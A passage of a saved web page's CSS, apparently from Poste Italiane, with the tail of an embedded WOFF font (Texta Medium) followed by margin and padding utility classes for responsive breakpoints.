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) format('woff'), /* Modern Browsers */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Medium/Texta-Medium.ttf*/ url() format('truetype'), /* Safari, Android, iOS */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Medium/Texta-Medium.svg#Texta-Bold*/ url() format('svg'); /* Legacy iOS */
    font-style: normal;
    font-weight: 600;
    text-rendering: optimizeLegibility;
}



/* END Medium */

/*savepage-import-url=/risorse_dt/condivise/stili/trasversali/spaces.css*//*****************************************************

    Foglio stile Spaziature - (c) Poste Italiane 2016/2017/2018 - GD//FS//DU

*****************************************************/


/* cutspacer/spacer (custom) */

.cutspacer-xs-top-75 {
    margin-top: -75px;
}

.spacer-xs-bottom-95 {
    margin-bottom: 95px;
}


/*margin 0*/

.spacer-xs-0 {
    margin: 0 !important;
}

.spacer-xs-top-0 {
    margin-top: 0 !important;
}

.spacer-xs-bottom-0 {
    margin-bottom: 0 !important;
}

.spacer-xs-left-0 {
    margin-left: 0 !important;
}

.spacer-xs-right-0 {
    margin-right: 0 !important;
}


/*margin 05*/

.spacer-xs-05 {
    margin: 5px !important;
}

.spacer-xs-top-05 {
    margin-top: 5px !important;
}

.spacer-xs-bottom-05 {
    margin-bottom: 5px !important;
}

.spacer-xs-left-05 {
    margin-left: 5px !important;
}

.spacer-xs-right-05 {
    margin-right: 5px !important;
}


/*margin 10*/

.spacer-xs-10 {
    margin: 10px !important;
}

.spacer-xs-top-10 {
    margin-top: 10px !important;
}

.spacer-xs-bottom-10 {
    margin-bottom: 10px !important;
}

.spacer-xs-left-10 {
    margin-left: 10px !important;
}

.spacer-xs-right-10 {
    margin-right: 10px !important;
}


/*margin 15*/

.spacer-xs-15 {
    margin: 15px !important;
}

.spacer-xs-top-15 {
    margin-top: 15px !important;
}

.spacer-xs-bottom-15 {
    margin-bottom: 15px !important;
}

.spacer-xs-left-15 {
    margin-left: 15px !important;
}

.spacer-xs-right-15 {
    margin-right: 15px !important;
}


/*margin 20*/

.spacer-xs-20 {
    margin: 20px !important;
}

.spacer-xs-top-20 {
    margin-top: 20px !important;
}

.spacer-xs-bottom-20 {
    margin-bottom: 20px !important;
}

.spacer-xs-left-20 {
    margin-left: 20px !important;
}

.spacer-xs-right-20 {
    margin-right: 20px !important;
}


/*margin 25*/

.spacer-xs-25 {
    margin: 25px !important;
}

.spacer-xs-top-25 {
    margin-top: 25px !important;
}

.spacer-xs-bottom-25 {
    margin-bottom: 25px !important;
}

.spacer-xs-left-25 {
    margin-left: 25px !important;
}

.spacer-xs-right-25 {
    margin-right: 25px !important;
}


/*margin 30*/

.spacer-xs-30 {
    margin: 30px !important;
}

.spacer-xs-top-30 {
    margin-top: 30px !important;
}

.spacer-xs-bottom-30 {
    margin-bottom: 30px !important;
}

.spacer-xs-left-30 {
    margin-left: 30px !important;
}

.spacer-xs-right-30 {
    margin-right: 30px !important;
}

/*margin 35*/

.spacer-xs-35 {
    margin: 35px !important;
}

.spacer-xs-top-35 {
    margin-top: 35px !important;
}

.spacer-xs-bottom-35 {
    margin-bottom: 35px !important;
}

.spacer-xs-left-35 {
    margin-left: 35px !important;
}

.spacer-xs-right-35 {
    margin-right: 35px !important;
}

/*margin 40*/

.spacer-xs-40 {
    margin: 40px !important;
}

.spacer-xs-top-40 {
    margin-top: 40px !important;
}

.spacer-xs-bottom-40 {
    margin-bottom: 40px !important;
}

.spacer-xs-left-40 {
    margin-left: 40px !important;
}

.spacer-xs-right-40 {
    margin-right: 40px !important;
}


/*margin 100*/

.spacer-xs-100 {
    margin: 100px !important;
}

.spacer-xs-top-100 {
    margin-top: 100px !important;
}

.spacer-xs-bottom-100 {
    margin-bottom: 100px !important;
}

.spacer-xs-left-100 {
    margin-left: 100px !important;
}

.spacer-xs-right-100 {
    margin-right: 100px !important;
}


/*padding 0*/

.innerspacer-xs-0 {
    padding: 0 !important;
}

.innerspacer-xs-top-0 {
    padding-top: 0 !important;
}

.innerspacer-xs-bottom-0 {
    padding-bottom: 0 !important;
}

.innerspacer-xs-left-0 {
    padding-left: 0 !important;
}

.innerspacer-xs-right-0 {
    padding-right: 0 !important;
}


/*padding 05*/

.innerspacer-xs-05 {
    padding: 5px !important;
}

.innerspacer-xs-top-05 {
    padding-top: 5px !important;
}

.innerspacer-xs-bottom-05 {
    padding-bottom: 5px !important;
}

.innerspacer-xs-left-05 {
    padding-left: 5px !important;
}

.innerspacer-xs-right-05 {
    padding-right: 5px !important;
}


/*padding 10*/

.innerspacer-xs-10 {
    padding: 10px !important;
}

.innerspacer-xs-top-10 {
    padding-top: 10px !important;
}

.innerspacer-xs-bottom-10 {
    padding-bottom: 10px !important;
}

.innerspacer-xs-left-10 {
    padding-left: 10px !important;
}

.innerspacer-xs-right-10 {
    padding-right: 10px !important;
}


/*padding 15*/

.innerspacer-xs-15 {
    padding: 15px !important;
}

.innerspacer-xs-top-15 {
    padding-top: 15px !important;
}

.innerspacer-xs-bottom-15 {
    padding-bottom: 15px !important;
}

.innerspacer-xs-left-15 {
    padding-left: 15px !important;
}

.innerspacer-xs-right-15 {
    padding-right: 15px !important;
}


/*padding 20*/

.innerspacer-xs-20 {
    padding: 20px !important;
}

.innerspacer-xs-top-20 {
    padding-top: 20px !important;
}

.innerspacer-xs-bottom-20 {
    padding-bottom: 20px !important;
}

.innerspacer-xs-left-20 {
    padding-left: 20px !important;
}

.innerspacer-xs-right-20 {
    padding-right: 20px !important;
}


/*padding 25*/

.innerspacer-xs-25 {
    padding: 25px !important;
}

.innerspacer-xs-top-25 {
    padding-top: 25px !important;
}

.innerspacer-xs-bottom-25 {
    padding-bottom: 25px !important;
}

.innerspacer-xs-left-25 {
    padding-left: 25px !important;
}

.innerspacer-xs-right-25 {
    padding-right: 25px !important;
}


/*padding 30*/

.innerspacer-xs-30 {
    padding: 30px !important;
}

.innerspacer-xs-top-30 {
    padding-top: 30px !important;
}

.innerspacer-xs-bottom-30 {
    padding-bottom: 30px !important;
}

.innerspacer-xs-left-30 {
    padding-left: 30px !important;
}

.innerspacer-xs-right-30 {
    padding-right: 30px !important;
}

/*padding 35*/

.innerspacer-xs-35 {
    padding: 35px !important;
}

.innerspacer-xs-top-35 {
    padding-top: 35px !important;
}

.innerspacer-xs-bottom-35 {
    padding-bottom: 35px !important;
}

.innerspacer-xs-left-35 {
    padding-left: 35px !important;
}

.innerspacer-xs-right-35 {
    padding-right: 35px !important;
}

/*padding 40*/

.innerspacer-xs-40 {
    padding: 40px !important;
}

.innerspacer-xs-top-40 {
    padding-top: 40px !important;
}

.innerspacer-xs-bottom-40 {
    padding-bottom: 40px !important;
}

.innerspacer-xs-left-40 {
    padding-left: 40px !important;
}

.innerspacer-xs-right-40 {
    padding-right: 40px !important;
}


/*padding 50*/

.innerspacer-xs-50 {
    padding: 50px !important;
}

.innerspacer-xs-top-50 {
    padding-top: 50px !important;
}

.innerspacer-xs-bottom-50 {
    padding-bottom: 50px !important;
}

.innerspacer-xs-left-50 {
    padding-left: 50px !important;
}

.innerspacer-xs-right-50 {
    padding-right: 50px !important;
}


/****************** no-limit sm ******************/

@media (min-width: 768px) {
    /*margin 0*/
    .spacer-sm-0 {
        margin: 0 !important;
    }
    .spacer-sm-top-0 {
        margin-top: 0 !important;
    }
    .spacer-sm-bottom-0 {
        margin-bottom: 0 !important;
    }
    .spacer-sm-left-0 {
        margin-left: 0 !important;
    }
    .spacer-sm-right-0 {
        margin-right: 0 !important;
    }
    /*margin 05*/
    .spacer-sm-05 {
        margin: 5px !important;
    }
    .spacer-sm-top-05 {
        margin-top: 5px !important;
    }
    .spacer-sm-bottom-05 {
        margin-bottom: 5px !important;
    }
    .spacer-sm-left-05 {
        margin-left: 5px !important;
    }
    .spacer-sm-right-05 {
        margin-right: 5px !important;
    }
    /*margin 10*/
    .spacer-sm-10 {
        margin: 10px !important;
    }
    .spacer-sm-top-10 {
        margin-top: 10px !important;
    }
    .spacer-sm-bottom-10 {
        margin-bottom: 10px !important;
    }
    .spacer-sm-left-10 {
        margin-left: 10px !important;
    }
    .spacer-sm-right-10 {
        margin-right: 10px !important;
    }
    /*margin 15*/
    .spacer-sm-15 {
        margin: 15px !important;
    }
    .spacer-sm-top-15 {
        margin-top: 15px !important;
    }
    .spacer-sm-bottom-15 {
        margin-bottom: 15px !important;
    }
    .spacer-sm-left-15 {
        margin-left: 15px !important;
    }
    .spacer-sm-right-15 {
        margin-right: 15px !important;
    }
    /*margin 20*/
    .spacer-sm-20 {
        margin: 20px !important;
    }
    .spacer-sm-top-20 {
        margin-top: 20px !important;
    }
    .spacer-sm-bottom-20 {
        margin-bottom: 20px !important;
    }
    .spacer-sm-left-20 {
        margin-left: 20px !important;
    }
    .spacer-sm-right-20 {
        margin-right: 20px !important;
    }
    /*margin 25*/
    .spacer-sm-25 {
        margin: 25px !important;
    }
    .spacer-sm-top-25 {
        margin-top: 25px !important;
    }
    .spacer-sm-bottom-25 {
        margin-bottom: 25px !important;
    }
    .spacer-sm-left-25 {
        margin-left: 25px !important;
    }
    .spacer-sm-right-25 {
        margin-right: 25px !important;
    }
    /*margin 30*/
    .spacer-sm-30 {
        margin: 30px !important;
    }
    .spacer-sm-top-30 {
        margin-top: 30px !important;
    }
    .spacer-sm-bottom-30 {
        margin-bottom: 30px !important;
    }
    .spacer-sm-left-30 {
        margin-left: 30px !important;
    }
    .spacer-sm-right-30 {
        margin-right: 30px !important;
    }
    /*margin 35*/
    .spacer-sm-35 {
        margin: 35px !important;
    }
    .spacer-sm-top-35 {
        margin-top: 35px !important;
    }
    .spacer-sm-bottom-35 {
        margin-bottom: 35px !important;
    }
    .spacer-sm-left-35 {
        margin-left: 35px !important;
    }
    .spacer-sm-right-35 {
        margin-right: 35px !important;
    }
    /*margin 40*/
    .spacer-sm-40 {
        margin: 40px !important;
    }
    .spacer-sm-top-40 {
        margin-top: 40px !important;
    }
    .spacer-sm-bottom-40 {
        margin-bottom: 40px !important;
    }
    .spacer-sm-left-40 {
        margin-left: 40px !important;
    }
    .spacer-sm-right-40 {
        margin-right: 40px !important;
    }
    /*margin 100*/
    .spacer-sm-100 {
        margin: 100px !important;
    }
    .spacer-sm-top-100 {
        margin-top: 100px !important;
    }
    .spacer-sm-bottom-100 {
        margin-bottom: 100px !important;
    }
    .spacer-sm-left-100 {
        margin-left: 100px !important;
    }
    .spacer-sm-right-100 {
        margin-right: 100px !important;
    }
    /*padding 0*/
    .innerspacer-sm-0 {
        padding: 0 !important;
    }
    .innerspacer-sm-top-0 {
        padding-top: 0 !important;
    }
    .innerspacer-sm-bottom-0 {
        padding-bottom: 0 !important;
    }
    .innerspacer-sm-left-0 {
        padding-left: 0 !important;
    }
    .innerspacer-sm-right-0 {
        padding-right: 0 !important;
    }
    /*padding 05*/
    .innerspacer-sm-05 {
        padding: 5px !important;
    }
    .innerspacer-sm-top-05 {
        padding-top: 5px !important;
    }
    .innerspacer-sm-bottom-05 {
        padding-bottom: 5px !important;
    }
    .innerspacer-sm-left-05 {
        padding-left: 5px !important;
    }
    .innerspacer-sm-right-05 {
        padding-right: 5px !important;
    }
    /*padding 10*/
    .innerspacer-sm-10 {
        padding: 10px !important;
    }
    .innerspacer-sm-top-10 {
        padding-top: 10px !important;
    }
    .innerspacer-sm-bottom-10 {
        padding-bottom: 10px !important;
    }
    .innerspacer-sm-left-10 {
        padding-left: 10px !important;
    }
    .innerspacer-sm-right-10 {
        padding-right: 10px !important;
    }
    /*padding 15*/
    .innerspacer-sm-15 {
        padding: 15px !important;
    }
    .innerspacer-sm-top-15 {
        padding-top: 15px !important;
    }
    .innerspacer-sm-bottom-15 {
        padding-bottom: 15px !important;
    }
    .innerspacer-sm-left-15 {
        padding-left: 15px !important;
    }
    .innerspacer-sm-right-15 {
        padding-right: 15px !important;
    }
    /*padding 20*/
    .innerspacer-sm-20 {
        padding: 20px !important;
    }
    .innerspacer-sm-top-20 {
        padding-top: 20px !important;
    }
    .innerspacer-sm-bottom-20 {
        padding-bottom: 20px !important;
    }
    .innerspacer-sm-left-20 {
        padding-left: 20px !important;
    }
    .innerspacer-sm-right-20 {
        padding-right: 20px !important;
    }
    /*padding 25*/
    .innerspacer-sm-25 {
        padding: 25px !important;
    }
    .innerspacer-sm-top-25 {
        padding-top: 25px !important;
    }
    .innerspacer-sm-bottom-25 {
        padding-bottom: 25px !important;
    }
    .innerspacer-sm-left-25 {
        padding-left: 25px !important;
    }
    .innerspacer-sm-right-25 {
        padding-right: 25px !important;
    }
    /*padding 30*/
    .innerspacer-sm-30 {
        padding: 30px !important;
    }
    .innerspacer-sm-top-30 {
        padding-top: 30px !important;
    }
    .innerspacer-sm-bottom-30 {
        padding-bottom: 30px !important;
    }
    .innerspacer-sm-left-30 {
        padding-left: 30px !important;
    }
    .innerspacer-sm-right-30 {
        padding-right: 30px !important;
    }
    /*padding 35*/
    .innerspacer-sm-35 {
        padding: 35px !important;
    }
    .innerspacer-sm-top-35 {
        padding-top: 35px !important;
    }
    .innerspacer-sm-bottom-35 {
        padding-bottom: 35px !important;
    }
    .innerspacer-sm-left-35 {
        padding-left: 35px !important;
    }
    .innerspacer-sm-right-35 {
        padding-right: 35px !important;
    }
    /*padding 40*/
    .innerspacer-sm-40 {
        padding: 40px !important;
    }
    .innerspacer-sm-top-40 {
        padding-top: 40px !important;
    }
    .innerspacer-sm-bottom-40 {
        padding-bottom: 40px !important;
    }
    .innerspacer-sm-left-40 {
        padding-left: 40px !important;
    }
    .innerspacer-sm-right-40 {
        padding-right: 40px !important;
    }
    /*padding 50*/
    .innerspacer-sm-50 {
        padding: 50px !important;
    }
    .innerspacer-sm-top-40 {
        padding-top: 50px !important;
    }
    .innerspacer-sm-bottom-50 {
        padding-bottom: 50px !important;
    }
    .innerspacer-sm-left-50 {
        padding-left: 50px !important;
    }
    .innerspacer-sm-right-50 {
        padding-right: 50px !important;
    }
}


/****************** no-limit md ******************/

@media (min-width: 992px) {
    /*margin 0*/
    .spacer-md-0 {
        margin: 0 !important;
    }
    .spacer-md-top-0 {
        margin-top: 0 !important;
    }
    .spacer-md-bottom-0 {
        margin-bottom: 0 !important;
    }
    .spacer-md-left-0 {
        margin-left: 0 !important;
    }
    .spacer-md-right-0 {
        margin-right: 0 !important;
    }
    /*margin 05*/
    .spacer-md-05 {
        margin: 5px !important;
    }
    .spacer-md-top-05 {
        margin-top: 5px !important;
    }
    .spacer-md-bottom-05 {
        margin-bottom: 5px !important;
    }
    .spacer-md-left-05 {
        margin-left: 5px !important;
    }
    .spacer-md-right-05 {
        margin-right: 5px !important;
    }
    /*margin 10*/
    .spacer-md-10 {
        margin: 10px !important;
    }
    .spacer-md-top-10 {
        margin-top: 10px !important;
    }
    .spacer-md-bottom-10 {
        margin-bottom: 10px !important;
    }
    .spacer-md-left-10 {
        margin-left: 10px !important;
    }
    .spacer-md-right-10 {
        margin-right: 10px !important;
    }
    /*margin 15*/
    .spacer-md-15 {
        margin: 15px !important;
    }
    .spacer-md-top-15 {
        margin-top: 15px !important;
    }
    .spacer-md-bottom-15 {
        margin-bottom: 15px !important;
    }
    .spacer-md-left-15 {
        margin-left: 15px !important;
    }
    .spacer-md-right-15 {
        margin-right: 15px !important;
    }
    /*margin 20*/
    .spacer-md-20 {
        margin: 20px !important;
    }
    .spacer-md-top-20 {
        margin-top: 20px !important;
    }
    .spacer-md-bottom-20 {
        margin-bottom: 20px !important;
    }
    .spacer-md-left-20 {
        margin-left: 20px !important;
    }
    .spacer-md-right-20 {
        margin-right: 20px !important;
    }
    /*margin 25*/
    .spacer-md-25 {
        margin: 25px !important;
    }
    .spacer-md-top-25 {
        margin-top: 25px !important;
    }
    .spacer-md-bottom-25 {
        margin-bottom: 25px !important;
    }
    .spacer-md-left-25 {
        margin-left: 25px !important;
    }
    .spacer-md-right-25 {
        margin-right: 25px !important;
    }
    /*margin 30*/
    .spacer-md-30 {
        margin: 30px !important;
    }
    .spacer-md-top-30 {
        margin-top: 30px !important;
    }
    .spacer-md-bottom-30 {
        margin-bottom: 30px !important;
    }
    .spacer-md-left-30 {
        margin-left: 30px !important;
    }
    .spacer-md-right-30 {
        margin-right: 30px !important;
    }
    /*margin 35*/
    .spacer-md-35 {
        margin: 35px !important;
    }
    .spacer-md-top-35 {
        margin-top: 35px !important;
    }
    .spacer-md-bottom-35 {
        margin-bottom: 35px !important;
    }
    .spacer-md-left-35 {
        margin-left: 35px !important;
    }
    .spacer-md-right-35 {
        margin-right: 35px !important;
    }
    /*margin 40*/
    .spacer-md-40 {
        margin: 40px !important;
    }
    .spacer-md-top-40 {
        margin-top: 40px !important;
    }
    .spacer-md-bottom-40 {
        margin-bottom: 40px !important;
    }
    .spacer-md-left-40 {
        margin-left: 40px !important;
    }
    .spacer-md-right-40 {
        margin-right: 40px !important;
    }
    /*margin 100*/
    .spacer-md-100 {
        margin: 100px !important;
    }
    .spacer-md-top-100 {
        margin-top: 100px !important;
    }
    .spacer-md-bottom-100 {
        margin-bottom: 100px !important;
    }
    .spacer-md-left-100 {
        margin-left: 100px !important;
    }
    .spacer-md-right-100 {
        margin-right: 100px !important;
    }
    /*padding 0*/
    .innerspacer-md-0 {
        padding: 0 !important;
    }
    .innerspacer-md-top-0 {
        padding-top: 0 !important;
    }
    .innerspacer-md-bottom-0 {
        padding-bottom: 0 !important;
    }
    .innerspacer-md-left-0 {
        padding-left: 0 !important;
    }
    .innerspacer-md-right-0 {
        padding-right: 0 !important;
    }
    /*padding 05*/
    .innerspacer-md-05 {
        padding: 5px !important;
    }
    .innerspacer-md-top-05 {
        padding-top: 5px !important;
    }
    .innerspacer-md-bottom-05 {
        padding-bottom: 5px !important;
    }
    .innerspacer-md-left-05 {
        padding-left: 5px !important;
    }
    .innerspacer-md-right-05 {
        padding-right: 5px !important;
    }
    /*padding 10*/
    .innerspacer-md-10 {
        padding: 10px !important;
    }
    .innerspacer-md-top-10 {
        padding-top: 10px !important;
    }
    .innerspacer-md-bottom-10 {
        padding-bottom: 10px !important;
    }
    .innerspacer-md-left-10 {
        padding-left: 10px !important;
    }
    .innerspacer-md-right-10 {
        padding-right: 10px !important;
    }
    /*padding 15*/
    .innerspacer-md-15 {
        padding: 15px !important;
    }
    .innerspacer-md-top-15 {
        padding-top: 15px !important;
    }
    .innerspacer-md-bottom-15 {
        padding-bottom: 15px !important;
    }
    .innerspacer-md-left-15 {
        padding-left: 15px !important;
    }
    .innerspacer-md-right-15 {
        padding-right: 15px !important;
    }
    /*padding 20*/
    .innerspacer-md-20 {
        padding: 20px !important;
    }
    .innerspacer-md-top-20 {
        padding-top: 20px !important;
    }
    .innerspacer-md-bottom-20 {
        padding-bottom: 20px !important;
    }
    .innerspacer-md-left-20 {
        padding-left: 20px !important;
    }
    .innerspacer-md-right-20 {
        padding-right: 20px !important;
    }
    /*padding 25*/
    .innerspacer-md-25 {
        padding: 25px !important;
    }
    .innerspacer-md-top-25 {
        padding-top: 25px !important;
    }
    .innerspacer-md-bottom-25 {
        padding-bottom: 25px !important;
    }
    .innerspacer-md-left-25 {
        padding-left: 25px !important;
    }
    .innerspacer-md-right-25 {
        padding-right: 25px !important;
    }
    /*padding 30*/
    .innerspacer-md-30 {
        padding: 30px !important;
    }
    .innerspacer-md-top-30 {
        padding-top: 30px !important;
    }
    .innerspacer-md-bottom-30 {
        padding-bottom: 30px !important;
    }
    .innerspacer-md-left-30 {
        padding-left: 30px !important;
    }
    .innerspacer-md-right-30 {
        padding-right: 30px !important;
    }
    /*padding 35*/
    .innerspacer-md-35 {
        padding: 35px !important;
    }
    .innerspacer-md-top-35 {
        padding-top: 35px !important;
    }
    .innerspacer-md-bottom-35 {
        padding-bottom: 35px !important;
    }
    .innerspacer-md-left-35 {
        padding-left: 35px !important;
    }
    .innerspacer-md-right-35 {
        padding-right: 35px !important;
    }
    /*padding 40*/
    .innerspacer-md-40 {
        padding: 40px !important;
    }
    .innerspacer-md-top-40 {
        padding-top: 40px !important;
    }
    .innerspacer-md-bottom-40 {
        padding-bottom: 40px !important;
    }
    .innerspacer-md-left-40 {
        padding-left: 40px !important;
    }
    .innerspacer-md-right-40 {
        padding-right: 40px !important;
    }
    /*padding 50*/
    .innerspacer-md-50 {
        padding: 50px !important;
    }
    .innerspacer-md-top-40 {
        padding-top: 50px !important;
    }
    .innerspacer-md-bottom-50 {
        padding-bottom: 50px !important;
    }
    .innerspacer-md-left-50 {
        padding-left: 50px !important;
    }
    .innerspacer-md-right-50 {
        padding-right: 50px !important;
    }
}


/****************** no-limit lg ******************/

@media (min-width: 1200px) {
    /*margin 0*/
    .spacer-lg-0 {
        margin: 0 !important;
    }
    .spacer-lg-top-0 {
        margin-top: 0 !important;
    }
    .spacer-lg-bottom-0 {
        margin-bottom: 0 !important;
    }
    .spacer-lg-left-0 {
        margin-left: 0 !important;
    }
    .spacer-lg-right-0 {
        margin-right: 0 !important;
    }
    /*margin 05*/
